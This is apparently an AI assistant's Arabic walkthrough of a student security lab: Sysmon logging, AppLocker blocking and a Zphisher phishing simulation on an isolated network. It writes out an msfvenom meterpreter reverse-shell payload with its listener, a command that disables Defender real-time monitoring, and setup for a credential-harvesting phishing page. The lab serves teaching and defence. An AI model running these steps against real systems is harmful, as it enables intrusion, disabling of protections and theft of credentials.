أهلاً بك. أنت قمت بعمل ممتاز جداً في الـ **Part 1** و **Part 2** (حسب الصور التي أرفقتها في ملف الوورد، الاتصال ناجح و Sysmon جاهز). 

للإجابة على سؤالك الأول: **اللاب طويل نسبياً** لأنه يحتوي على جزئين رئيسيين (الجزء الأول: Sysmon & AppLocker، والجزء الثاني: محاكاة التصيد Zphisher). 
**الوقت المتوقع:** إذا كنت مركزاً، سيأخذ منك من **ساعتين إلى 3 ساعات** كحد أقصى (شاملاً التقاط الصور وكتابة التقرير).

بما أنك طلبت المساعدة في اللاب كاملاً (بما في ذلك Malware و Zphisher) وبما أنك تؤكد أنك في بيئة معزولة (Lab Environment) وتطبق ذلك لأغراض أكاديمية بناءً على طلب البروفيسور، سأقوم بإرشادك خطوة بخطوة. 

إليك خارطة الطريق الكاملة لما تبقى عليك فعله، مقسمة إلى أجزاء واضحة:

---

### الوضع الحالي (ما قمت به أنت):
*   أخذت Snapshot للويندوز. ✅
*   تأكدت من الاتصال بين Kali (192.168.56.15) و Windows (192.168.56.11). ✅
*   جهزت Sysmon وملف الـ Configuration. ✅

---

### الجزء القادم 1: إعداد Sysmon واستعراض الأحداث (Sysmon Tests)
الآن سنقوم بتوليد بعض الأنشطة لرؤية كيف يلتقطها Sysmon (مطلوب في التقرير).

**1. اختبار إنشاء ملف (File Creation - Event ID 11):**
*   على **Windows PowerShell** (كمسؤول)، نفذ:
    ```powershell
    New-Item -ItemType Directory -Path C:\Lab3 -Force
    Set-Content -Path C:\Lab3\TestFile.txt -Value "SPR320 Sysmon File Creation Test"
    ```
*   لاستعراض الحدث:
    ```powershell
    Get-WinEvent -FilterHashtable @{LogName="Microsoft-Windows-Sysmon/Operational"; ID=11} -MaxEvents 5 | Format-List TimeCreated, Id, Message
    ```
*   📸 **صورة مطلوبة:** صور النتيجة وأضف العنوان: `Sysmon File Creation Event (ID 11)`.

**2. اختبار الاتصال بالشبكة (Network Connection - Event ID 3):**
*   على **Kali**، شغلي سيرفر وهمي:
    ```bash
    cd ~/
    mkdir -p lab3-http
    cd lab3-http
    echo "SPR320 Network Test" > index.html
    python3 -m http.server 8080
    ```
*   على **Windows**، افتحي المتصفح أو استخدمي PowerShell:
    ```powershell
    curl.exe http://192.168.56.15:8080
    ```
*   لاستعراض الحدث على Windows:
    ```powershell
    Get-WinEvent -FilterHashtable @{LogName="Microsoft-Windows-Sysmon/Operational"; ID=3} -MaxEvents 5 | Format-List TimeCreated, Id, Message
    ```
*   📸 **صورة مطلوبة:** صور النتيجة وأضف العنوان: `Sysmon Network Connection Event (ID 3)`.

---

### الجزء القادم 2: إنشاء Malware وتوثيق الاختراق قبل AppLocker
هنا سنقوم بإنشاء الـ Backdoor (كما طلب الدكتور) وتشغيله **قبل** تفعيل AppLocker لكي نثبت أن الحماية كانت غير موجودة.

**1. إنشاء الـ Payload (على Kali):**
*   معرفة IP الكالي: `ifconfig` (لنفترض أنه `192.168.56.15`).
*   إنشاء الملف الضار (سنضعه في مجلد مشترك أو نرفعه لسيرفر الويندوز):
    ```bash
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.56.15 LPORT=4444 -f exe -o TrustMe.exe
    ```
*   ارفعي الملف إلى الويندوز (يمكنك استخدام سيرفر بايثون الذي شغلناه سابقاً، أو نقل الملف عبر Shared Folder أو عبر `scp`).

**2. تشغيل المستمع (Listener) على Kali:**
*   افتحي Terminal جديد في Kali:
    ```bash
    msfconsole -q
    use exploit/multi/handler
    set PAYLOAD windows/meterpreter/reverse_tcp
    set LHOST 192.168.56.15
    set LPORT 4444
    exploit
    ```

**3. تشغيل الملف الضار على Windows (قبل الحماية):**
*   على Windows (يُفضل إيقاف Windows Defender مؤقتاً لهذا الاختبار عبر `Set-MpPreference -DisableRealtimeMonitoring $true`).
*   اذهبي لمكان ملف `TrustMe.exe` وقومي بتشغيله (دبل كليك أو من الـ CMD).
*   **النتيجة:** يجب أن يعود لكِ Session في Kali (Meterpreter).
*   📸 **صورة مطلوبة:** صورة الـ Meterpreter Session التي فُتحت في Kali. العنوان: `Successful Meterpreter Session Before AppLocker`.

---

### الجزء القادم 3: إعداد AppLocker واختبار الحظر
الآن سنقوم بتفعيل الحماية كما طلب الدكتور.

**1. إعداد AppLocker (على Windows):**
*   اذهبي إلى `Local Security Policy` (ابحثي عنها في قائمة ابدأ).
*   اذهبي إلى: `Application Control Policies` -> `AppLocker`.
*   اختاري `Executable Rules`، واضغطي بيمين الماوس في المساحة الفارغة واختاري **Create Default Rules**.
*   كرري نفس الشيء لـ `Windows Installer Rules`، `Script Rules`، و `Packaged App Rules`.
*   اضغطي على `AppLocker` في القائمة اليسرى، ثم في اليمين اضغطي على `Configure rule enforcement`. 
*   ضعي علامة صح على `Configured` لكل القواعد، واختاري `Enforce rules` (وليس Audit).
*   **مهم جداً:** اذهبي لـ `Services.msc` (من قائمة ابدأ)، وابحثي عن **Application Identity**، وقومي بتشغيلها (Start) وجعلها Automatic.
*   افتحي CMD واكتبي: `gpupdate /force`

**2. اختبار الحظر:**
*   اذهبي لملف `TrustMe.exe`، وحاولي تشغيله مرة أخرى.
*   **النتيجة:** يجب أن تظهر شاشة زرقاء من ويندوز تقول "This app has been blocked by your administrator".
*   📸 **صورة مطلوبة:** صورة رسالة الحظر الزرقاء. العنوان: `AppLocker Blocking TrustMe.exe`.

**3. التفاعل بين Sysmon و AppLocker:**
*   بما أن AppLocker منع الملف، سنرى ماذا سجل Sysmon.
*   في Windows PowerShell:
    ```powershell
    Get-WinEvent -LogName "Microsoft-Windows-AppLocker/EXE and DLL" -MaxEvents 10 | Format-List TimeCreated, Id, Message
    Get-WinEvent -FilterHashtable @{LogName="Microsoft-Windows-Sysmon/Operational"; ID=1} -MaxEvents 5 | Format-List TimeCreated, Id, Message
    ```
*   ستلاحظين أن AppLocker سجل Event ID **8004** (Blocked)، وأن Sysmon لم يسجل تنفيذ العملية (لأنها لم تنفذ أصلاً)، أو سجل محاولة فاشلة.

---

### الجزء القادم 4: محاكاة التصيد باستخدام Zphisher (الجزء الثاني من اللاب)
هذا الجزء يطلب منك عمل Phishing Simulation في بيئة معزولة وآمنة. سأعطيك الخطوات الأساسية لبيئة Kali.

**1. تحميل وتثبيت Zphisher على Kali:**
```bash
sudo apt update
sudo apt install git php curl -y
git clone https://github.com/htr-tech/zphisher.git
cd zphisher
chmod +x zphisher.sh
bash zphisher.sh
```

**2. تشغيل المحاكاة:**
*   سيظهر لك قائمة، اختاري مثلاً **Facebook** (كخيار للتصيد).
*   سيطلب منك اختيار طريقة الاتصال (Port Forwarding)، اختاري **Localhost** (لأننا في بيئة معزولة ولن نستخدم الإنترنت الحقيقي).
*   سيظهر لك رابط وهمي (مثلاً `http://127.0.0.1:8080`).
*   **في جهاز Kali نفسه (أو جهاز ثاني في نفس الشبكة):** افتحي المتصفح واذهبي للرابط.
*   أدخلي أي اسم مستخدم وكلمة مرور وهمية.
*   **النتيجة:** سيعودك Zphisher لصفحة فيسبوك الحقيقية، ولكن في طرفية Kali ستظهر لك البيانات التي أدخلتها (Username & Password).
*   📸 **صورة مطلوبة:** صورة لشاشة Zphisher وقد التقطت اسم المستخدم وكلمة المرور الوهمية. العنوان: `Zphisher Credential Capture Simulation`.

---

### ماذا يجب أن يحتوي تقريرك النهائي؟
بناءً على متطلبات الدكتور، التقرير يجب أن يحتوي على:
1.  **مقدمة:** عن أهمية Sysmon و AppLocker.
2.  **خطوات الإعداد:** (الصور التي أخذتها في Part 1 و Part 2).
3.  **الاختبارات:** (صور Sysmon Events).
4.  **قبل الحماية:** (صورة Meterpreter Session).
5.  **بعد الحماية:** (صورة رسالة AppLocker الزرقاء).
6.  **محاكاة التصيد:** (صورة Zphisher).
7.  **شرح النتائج:** لماذا نجح AppLocker؟ كيف ساعد Sysmon في رؤية ما يحدث؟

**نصيحة أخيرة:** بعد الانتهاء من Zphisher، قومي بإغلاق السيرفر (`Ctrl+C`) وامسحي مجلد Zphisher لتكوني آمنة. ثم ارجعي إلى الـ Snapshot الذي أخذتيه في البداية (كما طلب الدكتور) لتدمير البيئة (Lab Destruction).

**هل تريدين أن أشرح لك أي خطوة من هذه الخطوات بتفصيل أكثر (مثلاً كيفية نقل الملف من Kali إلى Windows)؟**
